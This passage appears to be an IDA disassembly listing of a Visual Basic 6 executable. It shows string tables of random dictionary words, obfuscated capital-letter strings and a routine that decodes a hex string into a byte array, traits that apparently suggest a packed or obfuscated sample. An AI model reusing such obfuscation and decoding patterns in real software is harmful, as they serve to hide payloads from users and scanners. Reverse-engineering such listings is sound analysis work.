.text:00407070                 dd offset aExpecting    ; "expecting"
.text:00407074                 dd offset asc_40758C    ; "X"
.text:00407078                 dd offset aClicked3     ; "Clicked3"
.text:0040707C                 dd offset aAggresses4   ; "Aggresses4"
.text:00407080                 dd offset asc_40758C    ; "X"
.text:00407084                 dd 0
.text:00407088                 dd offset aAphanite     ; "Aphanite"
.text:0040708C                 dd offset aAdamance2    ; "Adamance2"
.text:00407090                 dd offset aImitate      ; "Imitate"
.text:00407094                 align 8
.text:00407098                 dd offset aArithmetically ; "Arithmetically"
.text:0040709C                 dd offset aAlgas        ; "algas"
.text:004070A0                 dd offset aChase        ; "chase"
.text:004070A4                 dd offset aInapplicable ; "inapplicable"
.text:004070A8                 dd offset aDimple       ; "dimple"
.text:004070AC                 align 10h
.text:004070B0 off_4070B0      dd offset dword_407448  ; DATA XREF: .text:004074DC↓o
.text:004070B4                 dd offset dword_407408
.text:004070B8                 dd offset dword_4073C8
.text:004070BC                 dd offset dword_407388
.text:004070C0                 dd offset dword_407348
.text:004070C4                 dd 0FFFFFFFFh, 6F90000h, 0FFFFh, 0
.text:004070D4                 dd 60030000h, 407038h, 3 dup(0)
.text:004070E8                 dd 1Eh, 6F90000h, 0FFFFh, 0
.text:004070F8                 dd 60030000h, 407038h, 3 dup(0)
.text:0040710C                 dd 1Eh, 6F90000h, 0FFFFh, 0
.text:0040711C                 dd 60030000h, 407038h, 3 dup(0)
.text:00407130 dword_407130    dd 1Eh, 350000h, 0FFFFh, 0
.text:00407130                                         ; DATA XREF: .text:00407304↓o
.text:00407140                 dd 60030008h, 407038h, 3 dup(0)
.text:00407154                 dd 1Eh, 21000Ch, 0FFFFh, 0
.text:00407164                 dd 60030001h, 407060h, 3 dup(0)
.text:00407178                 dd 830301Eh, 6F90000h, 0FFFFh, 0
.text:00407188                 dd 60030000h, 407038h, 3 dup(0)
.text:0040719C dword_40719C    dd 1Eh, 390108h, 0FFFFh, 0
.text:0040719C                                         ; DATA XREF: .text:00407308↓o
.text:004071AC                 dd 60030009h, 407048h, 3 dup(0)
.text:004071C0 dword_4071C0    dd 280F1Eh, 3D0108h, 0FFFFh, 0
.text:004071C0                                         ; DATA XREF: .text:0040730C↓o
.text:004071D0                 dd 6003000Ah, 407050h, 3 dup(0)
.text:004071E4                 dd 30061Eh, 250110h, 0FFFFh, 0
.text:004071F4                 dd 60030002h, 407078h, 3 dup(0)
.text:00407208 dword_407208    dd 902A101Eh, 30h, 410008h, 0FFFFh, 0
.text:00407208                                         ; DATA XREF: .text:00407310↓o
.text:0040721C                 dd 6003000Bh, 407058h, 3 dup(0)
.text:00407230 dword_407230    dd 651Eh, 10h, 290110h, 0FFFFh, 0
.text:00407230                                         ; DATA XREF: .text:004072F4↓o
.text:00407244                 dd 60030004h, 407088h, 3 dup(0)
.text:00407258                 dd 808301Eh, 30h, 1D0118h, 0FFFFh, 0
.text:0040726C                 dd 60030000h, 407098h, 3 dup(0)
.text:00407280 dword_407280    dd 808101Eh, 282808h, 2D000Ch, 0FFFFh, 0
.text:00407280                                         ; DATA XREF: .text:004072F8↓o
.text:00407294                 dd 60030005h, 40706Ch, 3 dup(0)
.text:004072A8 dword_4072A8    dd 651Eh, 65h, 8Dh, 310134h, 0FFFFh, 0
.text:004072A8                                         ; DATA XREF: .text:00407300↓o
.text:004072C0                 dd 60030007h, 407314h, 3 dup(0)
.text:004072D4 dword_4072D4    dd 0A810101Eh, 2 dup(0A8A8A8A8h), 28A8h, 407260h, 407158h
.text:004072EC                 dd 4071E8h, 0
.text:004072F4                 dd offset dword_407230+8
.text:004072F8                 dd offset dword_407280+8
.text:004072FC                 align 10h
.text:00407300                 dd offset dword_4072A8+0Ch
.text:00407304                 dd offset dword_407130+4
.text:00407308                 dd offset dword_40719C+4
.text:0040730C                 dd offset dword_4071C0+4
.text:00407310                 dd offset dword_407208+8
.text:00407314                 dd offset aCastrated    ; "Castrated"
.text:00407318                 dd offset aIntendeds1   ; "Intendeds1"
.text:0040731C                 dd offset aEquable      ; "equable"
.text:00407320                 dd offset aFantasizing  ; "fantasizing"
.text:00407324                 dd offset aAppreciativene ; "appreciativeness"
.text:00407328                 dd offset aAffaires     ; "Affaires"
.text:0040732C                 dd offset aLiquidate    ; "liquidate"
.text:00407330                 dd offset aAccretes     ; "accretes"
.text:00407334                 dd offset aAddictive    ; "Addictive"
.text:00407338                 dd offset aGlistering   ; "Glistering"
.text:0040733C                 dd offset aFunerals     ; "Funerals"
.text:00407340                 dd offset aEvaporitic   ; "evaporitic"
.text:00407344                 align 8
.text:00407348 dword_407348    dd 0                    ; DATA XREF: .text:0040196C↑o
.text:00407348                                         ; .text:004070C0↑o
.text:0040734C                 dd offset dword_401960
.text:00407350                 dd 0FFFFFFFFh, 0
.text:00407358                 dd 11h, 0
.text:00407360                 dd offset dword_4072D4+10h
.text:00407364                 align 8
.text:00407368                 dd offset dword_407488
.text:0040736C                 dd offset dword_406FC0+78h
.text:00407370                 dd offset dword_406FC0+78h
.text:00407374                 align 10h
.text:00407380                 dd 9Ch, 104h
.text:00407388 dword_407388    dd 0                    ; DATA XREF: .text:00401E8C↑o
.text:00407388                                         ; .text:004070BC↑o
.text:0040738C                 dd offset dword_401E80
.text:00407390                 dd 0FFFFFFFFh, 3 dup(0)
.text:004073A0                 dd offset dword_406FC0+84h
.text:004073A4                 align 8
.text:004073A8                 dd offset dword_406FC0+78h
.text:004073AC                 dd offset dword_406FC0+78h
.text:004073B0                 dd offset dword_406FC0+78h
.text:004073B4                 align 10h
.text:004073C0                 dd 44h, 4
.text:004073C8 dword_4073C8    dd 0                    ; DATA XREF: .text:00401CB8↑o
.text:004073C8                                         ; .text:004070B8↑o
.text:004073CC                 dd offset dword_401CAC
.text:004073D0                 dd 0FFFFFFFFh, 3 dup(0)
.text:004073E0                 dd offset dword_406FC0+78h
.text:004073E4                 align 8
.text:004073E8                 dd offset dword_406FC0+78h
.text:004073EC                 dd offset dword_406FC0+78h
.text:004073F0                 dd offset dword_406FC0+78h
.text:004073F4                 align 10h
.text:00407400                 dd 44h, 4
.text:00407408 dword_407408    dd 0                    ; DATA XREF: .text:00401B00↑o
.text:00407408                                         ; .text:004070B4↑o
.text:0040740C                 dd offset dword_401AF4
.text:00407410                 dd 0FFFFFFFFh, 3 dup(0)
.text:00407420                 dd offset dword_406FC0+7Ch
.text:00407424                 align 8
.text:00407428                 dd offset dword_406FC0+78h
.text:0040742C                 dd offset dword_406FC0+78h
.text:00407430                 dd offset dword_406FC0+78h
.text:00407434                 align 10h
.text:00407440                 dd 44h, 4
.text:00407448 dword_407448    dd 0                    ; DATA XREF: .text:0040181C↑o
.text:00407448                                         ; .text:off_4070B0↑o
.text:0040744C                 dd offset dword_401810
.text:00407450                 dd 0FFFFFFFFh, 3 dup(0)
.text:00407460                 dd offset dword_406FC0+80h
.text:00407464                 align 8
.text:00407468                 dd offset dword_406FC0+78h
.text:0040746C                 dd offset dword_406FC0+78h
.text:00407470                 dd offset dword_406FC0+78h
.text:00407474                 align 10h
.text:00407480                 dd 40h, 4
.text:00407488 dword_407488    dd 11h dup(0)           ; DATA XREF: .text:00407368↑o
.text:004074CC dword_4074CC    dd 0                    ; DATA XREF: .text:00402298↑o
.text:004074D0                 dd offset byte_40228C+4
.text:004074D4                 dd 0FFFFFFFFh, 0
.text:004074DC                 dd offset off_4070B0
.text:004074E0                 dd 3 dup(0)
.text:004074EC                 dd 0FFFFFFFFh, 0
.text:004074F4                 dd offset off_402534
.text:004074F8                 dd offset dword_4024B8+10h
.text:004074FC                 dd offset unk_40E5FC
.text:00407500                 dd offset off_402534
.text:00407504                 dd offset dword_40265C
.text:00407508                 dd offset unk_40E600
.text:0040750C                 dd offset off_402534
.text:00407510                 dd offset dword_4026EC
.text:00407514                 dd offset unk_40E604
.text:00407518                 dd offset off_402830
.text:0040751C                 dd offset dword_4027CC+10h
.text:00407520                 dd offset unk_40E608
.text:00407524 aArithmetically db 'Arithmetically',0   ; DATA XREF: .text:00407098↑o
.text:00407533                 align 4
.text:00407534 aAlgas          db 'algas',0            ; DATA XREF: .text:0040709C↑o
.text:0040753A                 align 4
.text:0040753C aChase          db 'chase',0            ; DATA XREF: .text:004070A0↑o
.text:00407542                 align 4
.text:00407544 aInapplicable   db 'inapplicable',0     ; DATA XREF: .text:004070A4↑o
.text:00407551                 align 4
.text:00407554 aDimple         db 'dimple',0           ; DATA XREF: .text:004070A8↑o
.text:0040755B                 align 4
.text:0040755C aDoest          db 'doest',0            ; DATA XREF: .text:00407060↑o
.text:00407562                 align 4
.text:00407564 aBaulked        db 'Baulked',0          ; DATA XREF: .text:00407064↑o
.text:0040756C aCanons         db 'Canons',0           ; DATA XREF: .text:00407068↑o
.text:00407573                 align 4
.text:00407574 aClicked3       db 'Clicked3',0         ; DATA XREF: .text:00407078↑o
.text:0040757D                 align 10h
.text:00407580 aAggresses4     db 'Aggresses4',0       ; DATA XREF: .text:0040707C↑o
.text:0040758B                 align 4
.text:0040758C asc_40758C      db 'X',0                ; DATA XREF: .text:00407074↑o
.text:0040758C                                         ; .text:00407080↑o
.text:0040758E                 align 10h
.text:00407590 aAphanite       db 'Aphanite',0         ; DATA XREF: .text:00407088↑o
.text:00407599                 align 4
.text:0040759C aAdamance2      db 'Adamance2',0        ; DATA XREF: .text:0040708C↑o
.text:004075A6                 align 4
.text:004075A8 aImitate        db 'Imitate',0          ; DATA XREF: .text:00407090↑o
.text:004075B0 aBoatload       db 'Boatload',0         ; DATA XREF: .text:0040706C↑o
.text:004075B9                 align 4
.text:004075BC aExpecting      db 'expecting',0        ; DATA XREF: .text:00407070↑o
.text:004075C6                 align 4
.text:004075C8 aCastrated      db 'Castrated',0        ; DATA XREF: .text:00407050↑o
.text:004075C8                                         ; .text:00407314↑o
.text:004075D2                 align 4
.text:004075D4 aIntendeds1     db 'Intendeds1',0       ; DATA XREF: .text:00407318↑o
.text:004075DF                 align 10h
.text:004075E0 aEquable        db 'equable',0          ; DATA XREF: .text:0040731C↑o
.text:004075E8 aFantasizing    db 'fantasizing',0      ; DATA XREF: .text:00407320↑o
.text:004075F4 aAppreciativene db 'appreciativeness',0 ; DATA XREF: .text:00407324↑o
.text:00407605                 align 4
.text:00407608 aAffaires       db 'Affaires',0         ; DATA XREF: .text:00407328↑o
.text:00407611                 align 4
.text:00407614 aLiquidate      db 'liquidate',0        ; DATA XREF: .text:0040732C↑o
.text:0040761E                 align 10h
.text:00407620 aAccretes       db 'accretes',0         ; DATA XREF: .text:00407330↑o
.text:00407629                 align 4
.text:0040762C aAddictive      db 'Addictive',0        ; DATA XREF: .text:00407334↑o
.text:00407636                 align 4
.text:00407638 aGlistering     db 'Glistering',0       ; DATA XREF: .text:00407338↑o
.text:00407643                 align 4
.text:00407644 aFunerals       db 'Funerals',0         ; DATA XREF: .text:0040733C↑o
.text:0040764D                 align 10h
.text:00407650 aEvaporitic     db 'evaporitic',0       ; DATA XREF: .text:00407340↑o
.text:0040765B                 align 4
.text:0040765C aCrisis2        db 'Crisis2',0
.text:00407664 aAdjourned      db 'adjourned',0        ; DATA XREF: .text:00407058↑o
.text:0040766E                 align 10h
.text:00407670 aHangfire6      db 'Hangfire6',0        ; DATA XREF: .text:0040705C↑o
.text:0040767A                 align 10h
.text:00407680 dword_407680    dd 0E9E9E9E9h           ; DATA XREF: .text:00402060↑o
.text:00407684 ; ---------------------------------------------------------------------------
.text:00407684
.text:00407684 loc_407684:                             ; CODE XREF: .text:00401958↑j
.text:00407684                 push    ebp
.text:00407685                 mov     ebp, esp
.text:00407687                 sub     esp, 0Ch
.text:0040768A                 push    offset __vbaExceptHandler
.text:0040768F                 mov     eax, large fs:0
.text:00407695                 push    eax
.text:00407696                 mov     large fs:0, esp
.text:0040769D                 push    18h
.text:0040769F                 pop     eax
.text:004076A0                 call    __vbaChkstk
.text:004076A5                 push    ebx
.text:004076A6                 push    esi
.text:004076A7                 push    edi
.text:004076A8                 mov     [ebp-0Ch], esp
.text:004076AB                 mov     dword ptr [ebp-8], offset dword_401118
.text:004076B2                 mov     eax, [ebp+8]
.text:004076B5                 and     eax, 1
.text:004076B8                 mov     [ebp-4], eax
.text:004076BB                 mov     eax, [ebp+8]
.text:004076BE                 and     al, 0FEh
.text:004076C0                 mov     [ebp+8], eax
.text:004076C3                 mov     eax, [ebp+8]
.text:004076C6                 mov     eax, [eax]
.text:004076C8                 push    dword ptr [ebp+8]
.text:004076CB                 call    dword ptr [eax+4]
.text:004076CE                 cmp     dword_40E010, 0
.text:004076D5                 jnz     short loc_4076EF
.text:004076D7                 push    offset dword_40E010
.text:004076DC                 push    offset dword_401810
.text:004076E1                 call    __vbaNew2
.text:004076E6                 mov     dword ptr [ebp-28h], offset dword_40E010
.text:004076ED                 jmp     short loc_4076F6
.text:004076EF ; ---------------------------------------------------------------------------
.text:004076EF
.text:004076EF loc_4076EF:                             ; CODE XREF: .text:004076D5↑j
.text:004076EF                 mov     dword ptr [ebp-28h], offset dword_40E010
.text:004076F6
.text:004076F6 loc_4076F6:                             ; CODE XREF: .text:004076ED↑j
.text:004076F6                 mov     eax, [ebp-28h]
.text:004076F9                 mov     eax, [eax]
.text:004076FB                 mov     [ebp-18h], eax
.text:004076FE                 push    offset aOgunhqymldmakj ; "OGUNHQYMLDMAKJCUMKGTRMCEOBIEYMEAOUVUXNI"
.text:00407703                 mov     eax, [ebp-18h]
.text:00407706                 mov     eax, [eax]
.text:00407708                 push    dword ptr [ebp-18h]
.text:0040770B                 call    dword ptr [eax+16Ch]
.text:00407711                 fnclex
.text:00407713                 mov     [ebp-1Ch], eax
.text:00407716                 cmp     dword ptr [ebp-1Ch], 0
.text:0040771A                 jge     short loc_407736
.text:0040771C                 push    16Ch
.text:00407721                 push    offset dword_402488
.text:00407726                 push    dword ptr [ebp-18h]
.text:00407729                 push    dword ptr [ebp-1Ch]
.text:0040772C                 call    __vbaHresultCheckObj
.text:00407731                 mov     [ebp-2Ch], eax
.text:00407734                 jmp     short loc_40773A
.text:00407736 ; ---------------------------------------------------------------------------
.text:00407736
.text:00407736 loc_407736:                             ; CODE XREF: .text:0040771A↑j
.text:00407736                 and     dword ptr [ebp-2Ch], 0
.text:0040773A
.text:0040773A loc_40773A:                             ; CODE XREF: .text:00407734↑j
.text:0040773A                 mov     dword ptr [ebp-4], 0
.text:00407741                 mov     eax, [ebp+8]
.text:00407744                 mov     eax, [eax]
.text:00407746                 push    dword ptr [ebp+8]
.text:00407749                 call    dword ptr [eax+8]
.text:0040774C                 mov     eax, [ebp-4]
.text:0040774F                 mov     ecx, [ebp-14h]
.text:00407752                 mov     large fs:0, ecx
.text:00407759                 pop     edi
.text:0040775A                 pop     esi
.text:0040775B                 pop     ebx
.text:0040775C                 leave
.text:0040775D                 retn    4
.text:00407760 ; ---------------------------------------------------------------------------
.text:00407760
.text:00407760 loc_407760:                             ; CODE XREF: .text:00401CA4↑j
.text:00407760                 push    ebp
.text:00407761                 mov     ebp, esp
.text:00407763                 sub     esp, 0Ch
.text:00407766                 push    offset __vbaExceptHandler
.text:0040776B                 mov     eax, large fs:0
.text:00407771                 push    eax
.text:00407772                 mov     large fs:0, esp
.text:00407779                 push    18h
.text:0040777B                 pop     eax
.text:0040777C                 call    __vbaChkstk
.text:00407781                 push    ebx
.text:00407782                 push    esi
.text:00407783                 push    edi
.text:00407784                 mov     [ebp-0Ch], esp
.text:00407787                 mov     dword ptr [ebp-8], offset dword_401120
.text:0040778E                 mov     eax, [ebp+8]
.text:00407791                 and     eax, 1
.text:00407794                 mov     [ebp-4], eax
.text:00407797                 mov     eax, [ebp+8]
.text:0040779A                 and     al, 0FEh
.text:0040779C                 mov     [ebp+8], eax
.text:0040779F                 mov     eax, [ebp+8]
.text:004077A2                 mov     eax, [eax]
.text:004077A4                 push    dword ptr [ebp+8]
.text:004077A7                 call    dword ptr [eax+4]
.text:004077AA                 cmp     dword_40E024, 0
.text:004077B1                 jnz     short loc_4077CB
.text:004077B3                 push    offset dword_40E024
.text:004077B8                 push    offset dword_401AF4
.text:004077BD                 call    __vbaNew2
.text:004077C2                 mov     dword ptr [ebp-28h], offset dword_40E024
.text:004077C9                 jmp     short loc_4077D2
.text:004077CB ; ---------------------------------------------------------------------------
.text:004077CB
.text:004077CB loc_4077CB:                             ; CODE XREF: .text:004077B1↑j
.text:004077CB                 mov     dword ptr [ebp-28h], offset dword_40E024
.text:004077D2
.text:004077D2 loc_4077D2:                             ; CODE XREF: .text:004077C9↑j
.text:004077D2                 mov     eax, [ebp-28h]
.text:004077D5                 mov     eax, [eax]
.text:004077D7                 mov     [ebp-18h], eax
.text:004077DA                 push    offset aNzogmzjllpvnfg ; "NZOGMZJLLPVNFGFIYTCFHBSYNACQA"
.text:004077DF                 mov     eax, [ebp-18h]
.text:004077E2                 mov     eax, [eax]
.text:004077E4                 push    dword ptr [ebp-18h]
.text:004077E7                 call    dword ptr [eax+1C4h]
.text:004077ED                 fnclex
.text:004077EF                 mov     [ebp-1Ch], eax
.text:004077F2                 cmp     dword ptr [ebp-1Ch], 0
.text:004077F6                 jge     short loc_407812
.text:004077F8                 push    1C4h
.text:004077FD                 push    offset dword_40261C
.text:00407802                 push    dword ptr [ebp-18h]
.text:00407805                 push    dword ptr [ebp-1Ch]
.text:00407808                 call    __vbaHresultCheckObj
.text:0040780D                 mov     [ebp-2Ch], eax
.text:00407810                 jmp     short loc_407816
.text:00407812 ; ---------------------------------------------------------------------------
.text:00407812
.text:00407812 loc_407812:                             ; CODE XREF: .text:004077F6↑j
.text:00407812                 and     dword ptr [ebp-2Ch], 0
.text:00407816
.text:00407816 loc_407816:                             ; CODE XREF: .text:00407810↑j
.text:00407816                 mov     dword ptr [ebp-4], 0
.text:0040781D                 mov     eax, [ebp+8]
.text:00407820                 mov     eax, [eax]
.text:00407822                 push    dword ptr [ebp+8]
.text:00407825                 call    dword ptr [eax+8]
.text:00407828                 mov     eax, [ebp-4]
.text:0040782B                 mov     ecx, [ebp-14h]
.text:0040782E                 mov     large fs:0, ecx
.text:00407835                 pop     edi
.text:00407836                 pop     esi
.text:00407837                 pop     ebx
.text:00407838                 leave
.text:00407839                 retn    4
.text:0040783C ; ---------------------------------------------------------------------------
.text:0040783C
.text:0040783C loc_40783C:                             ; CODE XREF: .text:00401E78↑j
.text:0040783C                 push    ebp
.text:0040783D                 mov     ebp, esp
.text:0040783F                 sub     esp, 0Ch
.text:00407842                 push    offset __vbaExceptHandler
.text:00407847                 mov     eax, large fs:0
.text:0040784D                 push    eax
.text:0040784E                 mov     large fs:0, esp
.text:00407855                 push    18h
.text:00407857                 pop     eax
.text:00407858                 call    __vbaChkstk
.text:0040785D                 push    ebx
.text:0040785E                 push    esi
.text:0040785F                 push    edi
.text:00407860                 mov     [ebp-0Ch], esp
.text:00407863                 mov     dword ptr [ebp-8], offset dword_401128
.text:0040786A                 mov     eax, [ebp+8]
.text:0040786D                 and     eax, 1
.text:00407870                 mov     [ebp-4], eax
.text:00407873                 mov     eax, [ebp+8]
.text:00407876                 and     al, 0FEh
.text:00407878                 mov     [ebp+8], eax
.text:0040787B                 mov     eax, [ebp+8]
.text:0040787E                 mov     eax, [eax]
.text:00407880                 push    dword ptr [ebp+8]
.text:00407883                 call    dword ptr [eax+4]
.text:00407886                 cmp     dword_40E038, 0
.text:0040788D                 jnz     short loc_4078A7
.text:0040788F                 push    offset dword_40E038
.text:00407894                 push    offset dword_401CAC
.text:00407899                 call    __vbaNew2
.text:0040789E                 mov     dword ptr [ebp-28h], offset dword_40E038
.text:004078A5                 jmp     short loc_4078AE
.text:004078A7 ; ---------------------------------------------------------------------------
.text:004078A7
.text:004078A7 loc_4078A7:                             ; CODE XREF: .text:0040788D↑j
.text:004078A7                 mov     dword ptr [ebp-28h], offset dword_40E038
.text:004078AE
.text:004078AE loc_4078AE:                             ; CODE XREF: .text:004078A5↑j
.text:004078AE                 mov     eax, [ebp-28h]
.text:004078B1                 mov     eax, [eax]
.text:004078B3                 mov     [ebp-18h], eax
.text:004078B6                 push    0FFFFFFFFh
.text:004078B8                 mov     eax, [ebp-18h]
.text:004078BB                 mov     eax, [eax]
.text:004078BD                 push    dword ptr [ebp-18h]
.text:004078C0                 call    dword ptr [eax+14Ch]
.text:004078C6                 fnclex
.text:004078C8                 mov     [ebp-1Ch], eax
.text:004078CB                 cmp     dword ptr [ebp-1Ch], 0
.text:004078CF                 jge     short loc_4078EB
.text:004078D1                 push    14Ch
.text:004078D6                 push    offset dword_4026C0
.text:004078DB                 push    dword ptr [ebp-18h]
.text:004078DE                 push    dword ptr [ebp-1Ch]
.text:004078E1                 call    __vbaHresultCheckObj
.text:004078E6                 mov     [ebp-2Ch], eax
.text:004078E9                 jmp     short loc_4078EF
.text:004078EB ; ---------------------------------------------------------------------------
.text:004078EB
.text:004078EB loc_4078EB:                             ; CODE XREF: .text:004078CF↑j
.text:004078EB                 and     dword ptr [ebp-2Ch], 0
.text:004078EF
.text:004078EF loc_4078EF:                             ; CODE XREF: .text:004078E9↑j
.text:004078EF                 mov     dword ptr [ebp-4], 0
.text:004078F6                 mov     eax, [ebp+8]
.text:004078F9                 mov     eax, [eax]
.text:004078FB                 push    dword ptr [ebp+8]
.text:004078FE                 call    dword ptr [eax+8]
.text:00407901                 mov     eax, [ebp-4]
.text:00407904                 mov     ecx, [ebp-14h]
.text:00407907                 mov     large fs:0, ecx
.text:0040790E                 pop     edi
.text:0040790F                 pop     esi
.text:00407910                 pop     ebx
.text:00407911                 leave
.text:00407912                 retn    4
.text:00407915 ; ---------------------------------------------------------------------------
.text:00407915
.text:00407915 loc_407915:                             ; CODE XREF: .text:0040204C↑j
.text:00407915                 push    ebp
.text:00407916                 mov     ebp, esp
.text:00407918                 sub     esp, 0Ch
.text:0040791B                 push    offset __vbaExceptHandler
.text:00407920                 mov     eax, large fs:0
.text:00407926                 push    eax
.text:00407927                 mov     large fs:0, esp
.text:0040792E                 push    18h
.text:00407930                 pop     eax
.text:00407931                 call    __vbaChkstk
.text:00407936                 push    ebx
.text:00407937                 push    esi
.text:00407938                 push    edi
.text:00407939                 mov     [ebp-0Ch], esp
.text:0040793C                 mov     dword ptr [ebp-8], offset dword_401130
.text:00407943                 mov     eax, [ebp+8]
.text:00407946                 and     eax, 1
.text:00407949                 mov     [ebp-4], eax
.text:0040794C                 mov     eax, [ebp+8]
.text:0040794F                 and     al, 0FEh
.text:00407951                 mov     [ebp+8], eax
.text:00407954                 mov     eax, [ebp+8]
.text:00407957                 mov     eax, [eax]
.text:00407959                 push    dword ptr [ebp+8]
.text:0040795C                 call    dword ptr [eax+4]
.text:0040795F                 cmp     dword_40E04C, 0
.text:00407966                 jnz     short loc_407980
.text:00407968                 push    offset dword_40E04C
.text:0040796D                 push    offset dword_401E80
.text:00407972                 call    __vbaNew2
.text:00407977                 mov     dword ptr [ebp-28h], offset dword_40E04C
.text:0040797E                 jmp     short loc_407987
.text:00407980 ; ---------------------------------------------------------------------------
.text:00407980
.text:00407980 loc_407980:                             ; CODE XREF: .text:00407966↑j
.text:00407980                 mov     dword ptr [ebp-28h], offset dword_40E04C
.text:00407987
.text:00407987 loc_407987:                             ; CODE XREF: .text:0040797E↑j
.text:00407987                 mov     eax, [ebp-28h]
.text:0040798A                 mov     eax, [eax]
.text:0040798C                 mov     [ebp-18h], eax
.text:0040798F                 push    offset aMozvlaimjrijqt ; "MOZVLAIMJRIJQTDOBFTYRDACXNVBNSHEKE"
.text:00407994                 mov     eax, [ebp-18h]
.text:00407997                 mov     eax, [eax]
.text:00407999                 push    dword ptr [ebp-18h]
.text:0040799C                 call    dword ptr [eax+16Ch]
.text:004079A2                 fnclex
.text:004079A4                 mov     [ebp-1Ch], eax
.text:004079A7                 cmp     dword ptr [ebp-1Ch], 0
.text:004079AB                 jge     short loc_4079C7
.text:004079AD                 push    16Ch
.text:004079B2                 push    offset dword_402708
.text:004079B7                 push    dword ptr [ebp-18h]
.text:004079BA                 push    dword ptr [ebp-1Ch]
.text:004079BD                 call    __vbaHresultCheckObj
.text:004079C2                 mov     [ebp-2Ch], eax
.text:004079C5                 jmp     short loc_4079CB
.text:004079C7 ; ---------------------------------------------------------------------------
.text:004079C7
.text:004079C7 loc_4079C7:                             ; CODE XREF: .text:004079AB↑j
.text:004079C7                 and     dword ptr [ebp-2Ch], 0
.text:004079CB
.text:004079CB loc_4079CB:                             ; CODE XREF: .text:004079C5↑j
.text:004079CB                 mov     dword ptr [ebp-4], 0
.text:004079D2                 mov     eax, [ebp+8]
.text:004079D5                 mov     eax, [eax]
.text:004079D7                 push    dword ptr [ebp+8]
.text:004079DA                 call    dword ptr [eax+8]
.text:004079DD                 mov     eax, [ebp-4]
.text:004079E0                 mov     ecx, [ebp-14h]
.text:004079E3                 mov     large fs:0, ecx
.text:004079EA                 pop     edi
.text:004079EB                 pop     esi
.text:004079EC                 pop     ebx
.text:004079ED                 leave
.text:004079EE                 retn    4
.text:004079F1 ; ---------------------------------------------------------------------------
.text:004079F1
.text:004079F1 loc_4079F1:                             ; CODE XREF: .text:00401A60↑j
.text:004079F1                 push    ebp
.text:004079F2                 mov     ebp, esp
.text:004079F4                 sub     esp, 0Ch
.text:004079F7                 push    offset __vbaExceptHandler
.text:004079FC                 mov     eax, large fs:0
.text:00407A02                 push    eax
.text:00407A03                 mov     large fs:0, esp
.text:00407A0A                 push    54h ; 'T'
.text:00407A0C                 pop     eax
.text:00407A0D                 call    __vbaChkstk
.text:00407A12                 push    ebx
.text:00407A13                 push    esi
.text:00407A14                 push    edi
.text:00407A15                 mov     [ebp-0Ch], esp
.text:00407A18                 mov     dword ptr [ebp-8], offset dword_401138
.text:00407A1F                 mov     dword ptr [ebp-4], 0
.text:00407A26                 mov     eax, [ebp+8]
.text:00407A29                 mov     eax, [eax]
.text:00407A2B                 push    dword ptr [ebp+8]
.text:00407A2E                 call    dword ptr [eax+4]
.text:00407A31                 mov     edx, [ebp+0Ch]
.text:00407A34                 lea     ecx, [ebp-20h]
.text:00407A37                 call    __vbaStrCopy
.text:00407A3C                 push    0
.text:00407A3E                 push    dword ptr [ebp-20h]
.text:00407A41                 call    sub_40D139
.text:00407A46                 push    eax
.text:00407A47                 push    1
.text:00407A49                 push    11h
.text:00407A4B                 mov     eax, [ebp+8]
.text:00407A4E                 add     eax, 64h ; 'd'
.text:00407A51                 push    eax
.text:00407A52                 push    1
.text:00407A54                 push    80h
.text:00407A59                 call    __vbaRedim
.text:00407A5E                 add     esp, 1Ch
.text:00407A61                 push    dword ptr [ebp-20h]
.text:00407A64                 call    sub_40D139
.text:00407A69                 mov     ecx, eax
.text:00407A6B                 sub     ecx, 1
.text:00407A6E                 jo      loc_407D44
.text:00407A74                 call    __vbaI2I4
.text:00407A79                 mov     [ebp-50h], ax
.text:00407A7D                 mov     word ptr [ebp-4Ch], 2
.text:00407A83                 and     word ptr [ebp-18h], 0
.text:00407A88                 jmp     short loc_407A9C
.text:00407A8A ; ---------------------------------------------------------------------------
.text:00407A8A
.text:00407A8A loc_407A8A:                             ; CODE XREF: .text:00407B59↓j
.text:00407A8A                 mov     ax, [ebp-18h]
.text:00407A8E                 add     ax, [ebp-4Ch]
.text:00407A92                 jo      loc_407D44
.text:00407A98                 mov     [ebp-18h], ax
.text:00407A9C
.text:00407A9C loc_407A9C:                             ; CODE XREF: .text:00407A88↑j
.text:00407A9C                 mov     ax, [ebp-18h]
.text:00407AA0                 cmp     ax, [ebp-50h]
.text:00407AA4                 jg      loc_407B5E
.text:00407AAA                 lea     eax, [ebp-2Ch]
.text:00407AAD                 push    eax
.text:00407AAE                 push    2
.text:00407AB0                 mov     ax, [ebp-18h]
.text:00407AB4                 add     ax, 5
.text:00407AB8                 jo      loc_407D44
.text:00407ABE                 sub     ax, 4
.text:00407AC2                 jo      loc_407D44
.text:00407AC8                 movsx   eax, ax
.text:00407ACB                 push    eax
.text:00407ACC                 lea     eax, [ebp-20h]
.text:00407ACF                 push    eax
.text:00407AD0                 mov     eax, [ebp+8]
.text:00407AD3                 mov     eax, [eax]
.text:00407AD5                 push    dword ptr [ebp+8]
.text:00407AD8                 call    dword ptr [eax+28h]
.text:00407ADB                 mov     [ebp-48h], eax
.text:00407ADE                 cmp     dword ptr [ebp-48h], 0
.text:00407AE2                 jge     short loc_407AFB
.text:00407AE4                 push    28h ; '('
.text:00407AE6                 push    offset dword_4027CC
.text:00407AEB                 push    dword ptr [ebp+8]
.text:00407AEE                 push    dword ptr [ebp-48h]
.text:00407AF1                 call    __vbaHresultCheckObj
.text:00407AF6                 mov     [ebp-5Ch], eax
.text:00407AF9                 jmp     short loc_407AFF
.text:00407AFB ; ---------------------------------------------------------------------------
.text:00407AFB
.text:00407AFB loc_407AFB:                             ; CODE XREF: .text:00407AE2↑j
.text:00407AFB                 and     dword ptr [ebp-5Ch], 0
.text:00407AFF
.text:00407AFF loc_407AFF:                             ; CODE XREF: .text:00407AF9↑j
.text:00407AFF                 push    offset asc_402BEC ; "&H"
.text:00407B04                 push    dword ptr [ebp-2Ch]
.text:00407B07                 call    __vbaStrCat
.text:00407B0C                 mov     edx, eax
.text:00407B0E                 lea     ecx, [ebp-30h]
.text:00407B11                 call    __vbaStrMove
.text:00407B16                 push    eax
.text:00407B17                 call    __vbaR8Str
.text:00407B1C                 call    __vbaFpUI1
.text:00407B21                 mov     cl, al
.text:00407B23                 mov     eax, [ebp+8]
.text:00407B26                 mov     esi, [eax+64h]
.text:00407B29                 mov     ax, [ebp-18h]
.text:00407B2D                 cwd
.text:00407B2F                 sub     ax, dx
.text:00407B32                 sar     ax, 1
.text:00407B35                 movsx   eax, ax
.text:00407B38                 mov     edx, [ebp+8]
.text:00407B3B                 mov     edx, [edx+64h]
